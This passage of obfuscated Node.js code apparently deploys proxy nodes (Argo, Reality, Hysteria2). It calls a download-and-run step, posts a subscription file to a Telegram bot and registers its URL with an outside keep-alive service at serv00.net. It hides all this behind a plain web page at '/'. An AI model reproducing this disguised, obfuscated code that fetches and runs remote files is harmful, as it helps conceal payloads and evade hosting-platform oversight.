    _0x17107a = _0x238ceb
  if (!BOT_TOKEN || !CHAT_ID) {
    console['log'](_0x17107a(0x178))
    return
  }
  try {
    const _0x3d7741 = fs[_0x17107a(0x192)](subPath, _0x17107a(_0x7bd839._0x131b98)),
      _0x1907d4 = 'https://api.telegram.org/bot' + BOT_TOKEN + _0x17107a(0x195),
      _0x123f29 = NAME['replace'](/[_*\[\]()~`>#+=|{}.!-]/g, _0x17107a(0x1c6)),
      _0x28cb2c = { chat_id: CHAT_ID, text: '**' + _0x123f29 + _0x17107a(0x255) + _0x3d7741 + _0x17107a(0x1ec), parse_mode: 'MarkdownV2' }
    ;(await axios[_0x17107a(0x1c4)](_0x1907d4, null, { params: _0x28cb2c }), console[_0x17107a(_0x7bd839._0x2f0878)](_0x17107a(0x1ed)))
  } catch (_0x4dbca6) {
    console[_0x17107a(_0x7bd839._0x520e08)](_0x17107a(0x24b), _0x4dbca6['message'])
  }
}
async function AddVisitTask() {
  const _0x798acd = { _0x5237d5: 0x1e6, _0x141e30: 0x17f },
    _0x1238e2 = _0x238ceb
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console[_0x1238e2(_0x798acd._0x5237d5)](_0x1238e2(0x27b))
    return
  }
  try {
    const _0x58b19 = await axios[_0x1238e2(0x1c4)](
      'https://oooo.serv00.net/add-url',
      { url: PROJECT_URL },
      { headers: { 'Content-Type': _0x1238e2(0x250) } }
    )
    return (console['log'](_0x1238e2(0x1a3)), _0x58b19)
  } catch (_0x247e8b) {
    return (console[_0x1238e2(0x1ba)](_0x1238e2(_0x798acd._0x141e30) + _0x247e8b[_0x1238e2(0x246)]), null)
  }
}
async function startserver() {
  const _0x28a810 = { _0x1cff12: 0x1ba, _0x1b7af3: 0x16f },
    _0x41d46e = _0x238ceb
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram(),
      await AddVisitTask())
  } catch (_0x3e30d7) {
    console[_0x41d46e(_0x28a810._0x1cff12)](_0x41d46e(_0x28a810._0x1b7af3), _0x3e30d7)
  }
}
startserver()['catch']((_0x563b2e) => {
  const _0x1e9c1f = _0x238ceb
  console[_0x1e9c1f(0x1ba)]('Unhandled\x20error\x20in\x20startserver:', _0x563b2e)
})
const server = http['createServer'](async (_0x4055ec, _0x238b4a) => {
  const _0x52a3d1 = {
      _0x403c3f: 0x1c8,
      _0x44f52e: 0x24d,
      _0x53f233: 0x248,
      _0x23ccc0: 0x1e4,
      _0x4373cc: 0x20e,
      _0x57ec94: 0x21a,
      _0x4108d4: 0x1c9,
      _0x3cf60a: 0x187,
      _0x453b13: 0x21a
    },
    _0x1a86cc = _0x238ceb,
    _0x308582 = _0x4055ec[_0x1a86cc(0x1d1)][_0x1a86cc(_0x52a3d1._0x403c3f)]('?')[0x0]
  if (_0x308582 === '/' + SUB_PATH) {
    if (subContent) (_0x238b4a[_0x1a86cc(0x21a)](0xc8, { 'Content-Type': _0x1a86cc(0x24d) }), _0x238b4a[_0x1a86cc(0x248)](subContent))
    else
      try {
        const _0x29d9e4 = fs['readFileSync'](subPath, _0x1a86cc(0x181))
        ;(_0x238b4a['writeHead'](0xc8, { 'Content-Type': _0x1a86cc(0x24d) }), _0x238b4a[_0x1a86cc(0x248)](_0x29d9e4))
      } catch (_0x2b8341) {
        ;(_0x238b4a['writeHead'](0x1f7, { 'Content-Type': _0x1a86cc(_0x52a3d1._0x44f52e) }),
          _0x238b4a[_0x1a86cc(_0x52a3d1._0x53f233)](_0x1a86cc(0x1af)))
      }
    return
  }
  if (_0x308582 === '/') {
    try {
      const _0x1f388f = path['join'](__dirname, 'index.html'),
        _0x461d6c = await fs[_0x1a86cc(_0x52a3d1._0x23ccc0)][_0x1a86cc(_0x52a3d1._0x4373cc)](_0x1f388f, 'utf8')
      ;(_0x238b4a['writeHead'](0xc8, { 'Content-Type': 'text/html;\x20charset=utf-8' }), _0x238b4a['end'](_0x461d6c))
    } catch (_0x51e703) {
      ;(_0x238b4a[_0x1a86cc(_0x52a3d1._0x57ec94)](0xc8, { 'Content-Type': _0x1a86cc(_0x52a3d1._0x4108d4) }),
        _0x238b4a[_0x1a86cc(_0x52a3d1._0x53f233)](_0x1a86cc(_0x52a3d1._0x3cf60a)))
    }
    return
  }
  ;(_0x238b4a[_0x1a86cc(_0x52a3d1._0x453b13)](0x194, { 'Content-Type': _0x1a86cc(_0x52a3d1._0x44f52e) }), _0x238b4a['end'](_0x1a86cc(0x183)))
})
server[_0x238ceb(0x223)](PORT, () => alwaysLog(_0x238ceb(0x180) + PORT + '!'))
